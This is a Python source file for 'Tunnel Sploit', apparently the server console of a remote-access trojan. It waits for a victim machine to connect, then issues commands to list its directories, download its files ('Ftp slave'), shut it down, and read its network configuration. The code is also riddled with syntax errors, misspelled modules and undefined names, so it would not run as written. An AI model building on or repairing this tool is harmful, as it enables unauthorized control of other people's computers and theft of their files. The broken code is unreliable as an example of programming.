#There is more to come
import subproccess
import os
import time


try:
  import socket

except ImportError:
       print "Please Try Installing Sockets (Type Pip install Sockets in CMD)"
        sys.exit(1)
except KeyboardInterrupt:
        print "Tunnel Has been closed!"
        sys.exit(1)

banner = '''
  _____                       _ ____        _       _ _   
 |_   _|   _ _ __  _ __   ___| / ___| _ __ | | ___ (_) |_ 
   | || | | | '_ \| '_ \ / _ \ \___ \| '_ \| |/ _ \| | __|
   | || |_| | | | | | | |  __/ |___) | |_) | | (_) | | |_ 
   |_| \__,_|_| |_|_| |_|\___|_|____/| .__/|_|\___/|_|\__|
                                     |_|                  
Server

Tunnel Sploit 2018 Edition made by Blood Instagram:mrunityx Discord:メBloodソッ#8340
Any issues contact Me My Email is unityxstore@outlook.com 

'''
s = socket.socket()
host = socket.gethostnames()
port=8080
s.bind((host,port))

print(banner)
time.sleep(5)
print(".......")
time.sleep(5)
print("Your Tunnel Host:", host)
time.sleep(5)
print(".......................")
time.sleep(5)
print("TunnelSploit is waiting for Someone to Enter the Tunnel")
s.listen{1)
conn, addr = s.accept()
time.sleep(5)
print(".............................")
time.sleep(5)
print("Someones is in our tunnel")
print("There ip is:" , addr)
time.sleep(5)
print("y/n")
Answer = raw_input("Do you wish to clear your screen? ")
if Answer = y
  time.sleep(1)
  print("Clearing in 5")
  time.sleep(1)
  print("Clearing in 4")
  time.sleep(1)
  print("Clearing in 3")
  time.sleep(1)
  print("Clearing in 2")
  time.sleep(1)
  print("Clearing in 1")
  time.sleep(1)
  print("NOW!!!")
  os.system('clear')
  print(banner)
 else
   print("lets continue")
   
# Command Start
while 1:
   command = input(str("Shell >>"))
   if command  == "view_cwd":
     conn.send(command.encode())
     print("..................")
     time.sleep(5)
     print("Command sent awaiting execution")
     time.sleep(5)
     print("......................")
     conn.recv(1024)
     print("Command executed") 
     files = conn.recv(6000)
     files = files.decode()
     print("Result:", files)
         
     elif command == "Quit":
        conn.close()
        s.close()
        sys.exit()
        
       
     elif command  == "Custom dir":
       conn.send(command.encode())
       print("")
       user_input = input(str("Enter Directory:")
       conn.send(command.encode())
       print("")
       print("Scanning for Files in Directory")
       print("")
       files = con.recv(6000)
       files = files.decode()
       print("Results:", files)

       
     elif command  == "Ftp slave":
       conn.send(command.encode()) 
       filepath = input(str("Enter file you want to download"))
       conn.send(filepath.encode())
       file = conn.recv(100000)
       filename = input(str("Enter New name for the file including the extention :"))
       new_file = open(filename, "wb")
       new_file.write(file)
       new_file.close()
       print(" ")
       print("The Slaves File has been Downloaded Successfuly")
       print(" ")
       elif command == "Kill Pc":
        conn.send(command.encode())
        print("Killing Pc")

        elif command == "Shutdown":
        conn.send(command.encode())
        print("Killing Pc")



       elif command  == "ipconfig":
       conn.send(command.encode())
       print("")
       print("...........")
       conn.send(command.encode())
      
       ip = con.recv(6000)
       ip = ip.decode()
       print("Results:", ip)

     else:
      print("")
      print(".................")
      print("Command not Available at this time. It may be in future versions")
